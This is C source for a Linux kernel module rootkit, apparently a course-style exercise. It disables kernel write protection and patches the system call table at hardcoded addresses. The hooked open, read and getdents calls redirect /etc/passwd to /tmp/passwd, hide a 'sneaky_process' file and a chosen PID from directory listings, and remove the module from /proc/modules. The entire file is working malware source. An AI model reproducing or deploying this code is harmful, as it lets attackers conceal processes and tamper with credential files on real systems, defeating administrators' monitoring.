#include <linux/module.h>      // for all modules 
#include <linux/init.h>        // for entry/exit macros 
#include <linux/kernel.h>      // for printk and other kernel bits 
#include <asm/current.h>       // process information
#include <linux/sched.h>
#include <linux/highmem.h>     // for changing page permissions
#include <asm/unistd.h>        // for system call constants
#include <linux/kallsyms.h>
#include <asm/page.h>
#include <asm/cacheflush.h>

//Macros for kernel functions to alter Control Register 0 (CR0)
//This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
//Bit 0 is the WP-bit (write protection). We want to flip this to 0
//so that we can change the read/write permissions of kernel pages.
#define read_cr0() (native_read_cr0())
#define write_cr0(x) (native_write_cr0(x))

static int proc_sign = 0;
static int module_sign = 0;

static char* s_pid = "";
/*default sneaky pid = null*/
module_param(s_pid, charp, 0);
/*module parameter desciption: this is sneaky pid*/
MODULE_PARM_DESC(s_pid, "sneaky pid");

// license sign
MODULE_LICENSE("Dual MIT/GPL");


//linux built-in directory entry structure
struct linux_dirent {
u64 d_ino;
s64 d_off;
unsigned short d_reclen;
char d_name[];
};


//These are function pointers to the system calls that change page
//permissions for the given address (page) to read-only or read-write.
//Grep for "set_pages_ro" and "set_pages_rw" in:
//      /boot/System.map-`$(uname -r)`
//      e.g. /boot/System.map-4.4.0-116-generic
void (*pages_rw)(struct page* page, int numpages) = (void *)0xffffffff810707b0;
void (*pages_ro)(struct page* page, int numpages) = (void *)0xffffffff81070730;


//This is a pointer to the system call table in memory
//Defined in /usr/src/linux-source-3.13.0/arch/x86/include/asm/syscall.h
//We're getting its adddress from the System.map file (see above).
static unsigned long *sys_call_table = (unsigned long*)0xffffffff81a00200;


//Function pointer will be used to save address of original 'open' syscall.
//The asmlinkage keyword is a GCC #define that indicates this function
//should expect ti find its arguments on the stack (not in registers).
//This is used for all system calls.
asmlinkage int (*original_open)(const char* pathname, int flags, mode_t mode);
asmlinkage ssize_t (*original_read)(int fd, void *buf, size_t count);
asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dir_p, unsigned int count);


//Define our new sneaky version of the 'open' syscall
asmlinkage int s_open(const char* path, int flags, mode_t mode){
  const char* fromFile = "/tmp/passwd";
  printk(KERN_INFO "Very, very Sneaky!\n");
  
  if(strcmp(path, "/etc/passwd") == 0){
    // copy to user is a kernel funciton
    copy_to_user((void*)path, fromFile, strlen(fromFile) + 1);
  }
  else if(strcmp(path, "/proc") == 0){
    //this directory represents the kernel file system resources 
    proc_sign = 1;
  }
  else if(strcmp(path, "/proc/modules") == 0){
    //this directory represents the kernel module resources
    module_sign = 1;
  }
  
  return original_open(path, flags, mode);
}


//Define our new sneaky version of the 'read' syscall
asmlinkage ssize_t s_read(int fd, void *buf, size_t count){
  char* head = NULL;
  // original syscall read
  ssize_t read_size = original_read(fd, buf, count);
  ssize_t move_size;
  
  if(read_size > 0 && module_sign == 1 && ((head = strstr(buf,"sneaky_mod")) != NULL)) {
    char * tail = head;
    while(*tail != '\n'){
      tail++;
    }
    move_size = (ssize_t)(read_size - (tail + 1 - (char*)buf));
    read_size = (ssize_t)(read_size - (tail + 1 - head));
    tail++;
    
    memmove(head, tail, move_size);
    module_sign = 0;
  }
  
  return read_size;
}


//Define our new sneaky version of the 'getdents' syscall
asmlinkage int s_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count) {
  int read_size = original_getdents(fd, dirp, count);
  int curr_size = 0;
  struct linux_dirent *curr_dir = dirp;
  
  while (curr_size < read_size) {
    if ((strcmp(curr_dir->d_name, "sneaky_process") == 0) || ((strcmp(curr_dir->d_name, s_pid) == 0) && (proc_sign == 1))) {
      int curr_reclen = curr_dir->d_reclen;
      char *next_rec = (char *)curr_dir + curr_reclen;
      int len = (size_t)dirp + read_size - (size_t)next_rec;
      memmove(curr_dir, next_rec, len);
      read_size = read_size - curr_reclen;
      
      if (proc_sign == 1) {
        proc_sign = 0;
      }
      continue;
    }
    
    curr_size += curr_dir->d_reclen;
    curr_dir = (struct linux_dirent*) ((char*)dirp + curr_size);
  }
  
  return read_size;
}


//The code that gets executed when the module is loaded
static int initialize_sneaky_module(void){
  struct page *page_ptr;

  //See /var/log/syslog for kernel print output
  printk(KERN_INFO "Sneaky module being loaded.\n");

  //Turn off write protection mode
  write_cr0(read_cr0() & (~0x10000));
  //Get a pointer to the virtual page containing the address
  //of the system call table in the kernel.
  page_ptr = virt_to_page(&sys_call_table);
  //Make this page read-write accessible
  pages_rw(page_ptr, 1);

  //This is the magic! Save away the original 'open' system call
  //function address. Then overwrite its address in the system call
  //table with the function address of our new code.

  original_open = (void*)*(sys_call_table + __NR_open);
  *(sys_call_table + __NR_open) = (unsigned long)s_open;
  
  original_read = (void*)*(sys_call_table + __NR_read);
  *(sys_call_table + __NR_read) = (unsigned long)s_read;
  
  original_getdents = (void*)*(sys_call_table + __NR_getdents);
  *(sys_call_table + __NR_getdents) = (unsigned long)s_getdents;

  //Revert page to read-only
  pages_ro(page_ptr, 1);
  //Turn write protection mode back on
  write_cr0(read_cr0() | 0x10000);

  return 0;       // to show a successful load 
}  


// The code will automatically execute when the module is unloaded
static void exit_sneaky_module(void){
  struct page *page_ptr;

  printk(KERN_INFO "Sneaky module being unloaded.\n"); 

  //Turn off write protection mode
  write_cr0(read_cr0() & (~0x10000));

  //Get a pointer to the virtual page containing the address
  //of the system call table in the kernel.
  page_ptr = virt_to_page(&sys_call_table);
  //Make this page read-write accessible
  pages_rw(page_ptr, 1);

  //This is more magic! Restore the original 'open' system call
  //function address. Will look like malicious code was never there!
  *(sys_call_table + __NR_open) = (unsigned long)original_open;
  *(sys_call_table + __NR_read) = (unsigned long)original_read;
  *(sys_call_table + __NR_getdents) = (unsigned long)original_getdents;
  
  //Revert page to read-only
  pages_ro(page_ptr, 1);
  //Turn write protection mode back on
  write_cr0(read_cr0() | 0x10000);
}  

// what's called upon loading 
module_init(initialize_sneaky_module);
// what's called upon unloading  
module_exit(exit_sneaky_module);
